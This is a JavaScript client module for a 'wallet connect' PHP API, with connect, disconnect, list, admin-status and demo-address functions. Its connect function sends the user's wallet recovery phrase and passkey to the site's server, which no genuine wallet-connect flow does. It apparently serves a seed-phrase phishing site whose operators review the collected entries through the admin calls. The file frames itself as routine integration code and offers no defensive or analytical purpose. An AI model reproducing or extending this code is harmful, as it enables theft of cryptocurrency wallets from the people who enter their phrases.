/**
 * Shared client for api/wallet_connect_api.php (public, user profile, admin).
 */
(function (global) {
  "use strict";

  function WalletConnectSync() {}

  WalletConnectSync.apiUrl = "";
  WalletConnectSync.csrfToken = "";
  WalletConnectSync.adminCsrfToken = "";

  WalletConnectSync.post = function (body) {
    return fetch(this.apiUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json; charset=utf-8" },
      body: JSON.stringify(body),
      credentials: "same-origin",
    }).then(function (r) {
      return r.json();
    });
  };

  WalletConnectSync.getJson = function (query) {
    var url = this.apiUrl + (query || "");
    return fetch(url, { credentials: "same-origin" }).then(function (r) {
      return r.json();
    });
  };

  WalletConnectSync.connect = function (provider, chain, asset, source, phrase, passkey) {
    return this.post({
      action: "connect",
      csrf_token: this.csrfToken,
      provider: String(provider != null ? provider : ""),
      chain: chain || "Ethereum",
      asset: asset || "",
      source: source || "web",
      phrase: String(phrase != null ? phrase : ""),
      passkey: String(passkey != null ? passkey : ""),
    });
  };

  WalletConnectSync.disconnect = function (id) {
    return this.post({
      action: "disconnect",
      csrf_token: this.csrfToken,
      id: id,
    });
  };

  WalletConnectSync.list = function () {
    return this.getJson("?action=list");
  };

  WalletConnectSync.setStatus = function (id, status) {
    return this.post({
      action: "set_status",
      csrf_token: this.adminCsrfToken,
      id: id,
      status: status,
    });
  };

  WalletConnectSync.adminDisconnect = function (id) {
    return this.post({
      action: "admin_disconnect",
      csrf_token: this.adminCsrfToken,
      id: id,
    });
  };

  WalletConnectSync.demoEthAddress = function () {
    var hex = "0123456789abcdef";
    var s = "0x";
    var buf = new Uint8Array(20);
    if (global.crypto && crypto.getRandomValues) {
      crypto.getRandomValues(buf);
    } else {
      for (var i = 0; i < 20; i++) buf[i] = (Math.random() * 256) | 0;
    }
    for (var j = 0; j < 20; j++) {
      s += hex[buf[j] >> 4] + hex[buf[j] & 15];
    }
    return s;
  };

  global.WalletConnectSync = WalletConnectSync;
})(typeof window !== "undefined" ? window : this);
